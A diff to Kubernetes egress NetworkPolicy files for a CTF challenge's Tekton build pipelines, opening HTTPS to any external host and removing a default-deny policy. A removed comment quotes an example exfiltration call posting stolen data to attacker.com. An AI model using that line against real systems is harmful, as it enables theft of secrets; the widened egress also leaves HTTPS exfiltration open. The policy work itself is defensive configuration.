@@ -62,10 +62,12 @@ metadata:
   annotations:
     description: >-
       Restricts egress traffic from CTF challenge pipelines.
-      This is the PRIMARY defense against the Tekton attack where
-      malicious code tries to exfiltrate stolen secrets via HTTP POST.
+      Allows only the traffic needed by the build pipeline:
+      DNS, K8s API, Gitea, local registry, and HTTPS to external
+      hosts (Alpine packages, Go proxy, GitHub releases for tools).
+      Non-HTTPS egress to the internet is blocked.
 spec:
-  podSelector: {}  # Apply to all pods in ctf-challenge namespace
+  podSelector: {}
   policyTypes:
   - Egress
   egress:
@@ -80,8 +82,7 @@ spec:
     - port: 53
       protocol: TCP
 
-  # Allow communication with Kubernetes API server (read-only operations)
-  # Note: RBAC should prevent write operations even if network allows it
+  # Allow communication with Kubernetes API server
   - to:
     - namespaceSelector: {}
       podSelector:
@@ -102,24 +103,28 @@ spec:
     - port: 22
       protocol: TCP
 
+  # Allow communication with internal registry
+  - to:
+    - namespaceSelector:
+        matchLabels:
+          kubernetes.io/metadata.name: registry
+    ports:
+    - port: 5000
+      protocol: TCP
+
+  # Allow HTTPS to external hosts (required by the build pipeline):
+  #   - Alpine CDN (dl-cdn.alpinelinux.org): apk add in Dockerfile and task steps
+  #   - Go module proxy (proxy.golang.org, sum.golang.org): go mod download
+  #   - GitHub releases (github.com, objects.githubusercontent.com):
+  #     oras, trivy, cosign CLI downloads
+  #
+  # Only port 443 is allowed — HTTP (80) and arbitrary ports are blocked,
+  # preventing plaintext exfiltration. RBAC and Kyverno provide additional
+  # layers to limit what pipeline code can do with this access.
+  - ports:
+    - port: 443
+      protocol: TCP
+
   # Allow communication within same namespace
   - to:
     - podSelector: {}
-
-  # CRITICAL: All other egress is BLOCKED
-  # This prevents: http.Post("http://attacker.com/loot", stolen_data)
----
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: default-deny-all-egress
-  namespace: ctf-challenge
-  annotations:
-    description: >-
-      Default deny policy as a safety net. If the above policy is
-      misconfigured, this ensures no traffic leaks out.
-spec:
-  podSelector: {}
-  policyTypes:
-  - Egress
-  # No egress rules = deny all egress
